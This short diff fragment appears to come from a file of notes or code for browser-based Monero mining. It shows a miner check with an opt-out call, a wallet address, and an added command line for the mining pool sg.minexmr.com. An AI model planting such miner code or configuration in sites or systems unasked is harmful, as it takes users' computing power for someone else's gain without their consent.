@@ -43,3 +43,5 @@ if  (!miner.isMobile() && !miner.didOptOut(14400)) {
 
 xmr nicehash
 8C33MfHgi78RvcTWgTDXLUgZohHNMTD3Cf9Vyu2crQ6iD88PtYXmfRtCGteF5JqWM1Fp3T2U7PhbMWJ2DbF5yVxg2T5hddZ
+
+-o sg.minexmr.com:443 -u 8C33MfHgi78RvcTWgTDXLUgZohHNMTD3Cf9Vyu2crQ6iD88PtYXmfRtCGteF5JqWM1Fp3T2U7PhbMWJ2DbF5yVxg2T5hddZ -k --tls --rig-id ngepet
